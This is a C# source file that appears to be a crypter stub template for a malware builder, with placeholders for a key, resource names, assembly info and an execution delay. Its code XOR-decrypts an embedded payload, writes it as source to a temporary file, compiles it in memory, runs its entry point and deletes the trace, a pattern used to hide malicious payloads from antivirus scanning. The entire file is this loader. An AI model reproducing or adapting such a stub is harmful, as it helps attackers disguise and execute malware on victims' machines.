using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Text;
using Microsoft.CSharp;

//[ASMINFO]

namespace DarthVader
{
    class Program
    {
        private static byte[] pass = Convert.FromBase64String("%password%");
        private static Dictionary<string, string> provider = new Dictionary<string, string>();
        private static string sPath2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Path.GetTempFileName());

        [STAThread]
        static void Main()
        {
            //EXECUTIONDELAY
            byte[] stdata = (byte[])new ResourceManager("%resname%", typeof(Program).Assembly).GetObject("%innername%");
            provider.Add("CompilerVersion", "v2.0");
            int data = FuncIt(ref stdata);
        }

        static int FuncIt(ref byte[] stdata)
        {
            for (int i = 0; i < stdata.Length; i++)
                stdata[i] = Convert.ToByte(stdata[i] ^ pass[i%pass.Length]);

            string SS = Encoding.UTF8.GetString(stdata);

            StreamWriter S;
            using (S = new StreamWriter(sPath2 + ".txt"))
            {
                S.Write(SS);
            }

            try
            {
                throw new RandomException();
            }
            catch (RandomException)
            {
                SmartAsm M = Compile(sPath2 + ".txt");
                M.Exec();
            }

            File.Delete(sPath2 + ".txt");
            return 0;            
        }

        static SmartAsm Compile(string sourceFile)
        {
            CompilerParameters options = new CompilerParameters();
            options.ReferencedAssemblies.Add("System.dll");
            options.CompilerOptions = "/target:winexe /platform:x86";
            options.GenerateExecutable = false;
            options.GenerateInMemory = true;
            CompilerResults results = new CSharpCodeProvider(provider).CompileAssemblyFromFile(options, new string[] { sourceFile });
            return new SmartAsm(results.CompiledAssembly);
        }
    }

    public class RandomException : Exception
    {
        
    }

    public class SmartAsm
    {
        public Assembly A { get; set; }

        public SmartAsm(Assembly A)
        {
            this.A = A;
        }

        public void Exec()
        {
            MethodInfo M = this.A.EntryPoint;
            M.Invoke(null, null);
        }
    }
}